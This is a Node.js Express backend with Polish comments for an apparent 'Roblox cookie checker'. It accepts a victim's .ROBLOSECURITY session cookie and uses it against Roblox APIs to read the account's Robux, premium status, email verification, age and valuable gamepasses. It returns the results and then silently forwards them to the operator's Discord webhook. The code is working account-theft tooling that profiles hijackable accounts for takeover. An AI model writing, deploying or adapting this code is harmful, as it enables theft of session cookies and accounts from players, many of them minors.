const express = require('express');
const app = express();

app.use(express.json());

// Obsługa CORS (żeby frontend z GitHub Pages mógł wysyłać zapytania)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.post('/check', async (req, res) => {   // ← endpoint /check (możesz zmienić na /api/get-username jeśli chcesz)
  const { cookie } = req.body || {};

  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // Twój oryginalny kod – bez zmian
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');

    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) {
      throw new Error(userRes.status === 401 ? 'Invalid or expired cookie' : `API error: ${userRes.status}`);
    }
    const userData = await userRes.json();

    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
        {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json',
          },
        }
      );
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
    const hasGamePasses = [];
    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: createdDate || 'failed to fetch',
      avatarUrl,
      hasGamePasses,
      emailVerified,
    };

    // Najpierw oddajemy wynik do frontendu
    res.status(200).json(result);

    // Potem wysyłamy do Twojego Discorda (jeśli zmienna istnieje)
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: `Roblox Checker | ${userData.name} (${userData.id})`,
              color: hasPremium ? 0x00CC66 : 0x5865F2,
              thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
              fields: [
                { name: "Username", value: userData.name, inline: true },
                { name: "Display Name", value: userData.displayName || userData.name, inline: true },
                { name: "User ID", value: userData.id.toString(), inline: true },
                { name: "Premium", value: hasPremium ? "Yes ✓" : "No ✗", inline: true },
                { name: "Email Verified", value: emailVerified ? "Yes ✓" : "No ✗", inline: true },
                { name: "Robux", value: robux.toLocaleString(), inline: true },
                { name: "Account Age", value: `${accountAgeDays} days`, inline: true },
                { name: "Created", value: createdDate || "—", inline: false },
                { name: "Gamepasses total", value: hasGamePasses.length.toString(), inline: true },
              ],
              footer: { text: "Sent from Railway • " + new Date().toISOString() },
              timestamp: new Date().toISOString()
            }]
          })
        });
        console.log(`Webhook wysłany dla ${userData.name}`);
      } catch (webhookErr) {
        console.error('Błąd webhooka:', webhookErr.message);
      }
    }

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

// Uruchomienie serwera
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
